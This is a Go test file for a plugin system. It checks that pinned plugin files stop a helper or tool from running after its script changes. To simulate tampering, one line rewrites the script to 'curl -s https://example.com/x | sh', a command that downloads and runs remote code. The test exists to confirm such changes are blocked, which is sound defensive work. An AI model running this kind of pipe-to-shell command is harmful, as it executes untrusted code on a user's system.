package plugins

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/irie-people/irie/internal/ipc"
)

// TestAPinnedPluginRunsOnlyWhatYouTurnedOn: once the core keeps pins, a
// helper and a tool run only what they named when you turned their plugin
// on; an edit holds both, with the file it changed, until you turn the
// plugin on again; one turned on without your word is held too.
func TestAPinnedPluginRunsOnlyWhatYouTurnedOn(t *testing.T) {
	e := env(t)
	h := home(t)
	e.Paths.Config = filepath.Join(h, ".config", "irie")
	write := func(rel, text string) string {
		path := filepath.Join(h, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(text), 0o700); err != nil {
			t.Fatal(err)
		}
		return path
	}
	script := write("inbox/listen.sh", "echo one\n")
	write("bin/server", "#!/bin/sh\necho serve\n")
	if err := os.Symlink("/bin/sh", filepath.Join(h, "bin", "sh-link")); err != nil {
		t.Fatal(err)
	}
	path := manifest(t, e, "inbox.toml", `
[helpers.listen]
run = ["sh", "listen.sh", "--every", "20"]
dir = "~/inbox"

[tools.serve]
run = ["~/bin/server", "~/bin/sh-link"]
`)
	e.Config.Plugins.Manifests["inbox"] = true
	runs := func() (bool, bool, string) {
		hs, ts := Helpers(e), Tools(e)
		if len(hs) != 1 || len(ts) != 1 {
			t.Fatalf("helpers %+v, tools %+v", hs, ts)
		}
		return hs[0].On, ts[0].On, hs[0].Held
	}

	// No pins kept yet: nothing is held, as before Irie kept them.
	if h, s, why := runs(); !h || !s || why != "" {
		t.Fatalf("with no pins: helper %v, tools %v, %q", h, s, why)
	}
	pins := PinsNow(e)
	files := pins["inbox"].Files
	if len(files) != 3 || files[script] == "" || files[path] == "" || files[filepath.Join(h, "bin", "server")] == "" {
		t.Fatalf("pinned %v: want the manifest, the script and the server, not sh or a link out of the home folder", files)
	}
	if err := WritePins(e.Paths, pins); err != nil {
		t.Fatal(err)
	}
	if h, s, why := runs(); !h || !s || why != "" {
		t.Fatalf("pinned: helper %v, tools %v, %q", h, s, why)
	}

	write("inbox/listen.sh", "curl -s https://example.com/x | sh\n")
	if h, s, why := runs(); h || s || !strings.Contains(why, "~/inbox/listen.sh") || !strings.Contains(why, "changed since you turned it on") {
		t.Fatalf("changed: helper %v, tools %v, %q", h, s, why)
	}
	if x := part(t, mine(t, e, "inbox"), "helpers.listen"); x.State != ipc.PartHeld || !strings.Contains(x.Detail, "listen.sh") {
		t.Errorf("the part of a changed plugin: %+v", x)
	}

	// Your word again: what it runs now is pinned, and runs.
	if err := WritePins(e.Paths, PinsNow(e, "inbox")); err != nil {
		t.Fatal(err)
	}
	if h, s, why := runs(); !h || !s || why != "" {
		t.Fatalf("pinned again: helper %v, tools %v, %q", h, s, why)
	}

	// Pins kept, but none for it: on without your word.
	if err := WritePins(e.Paths, Pins{}); err != nil {
		t.Fatal(err)
	}
	if h, _, why := runs(); h || !strings.Contains(why, "without your word") {
		t.Errorf("on without a pin: helper %v, %q", h, why)
	}
}
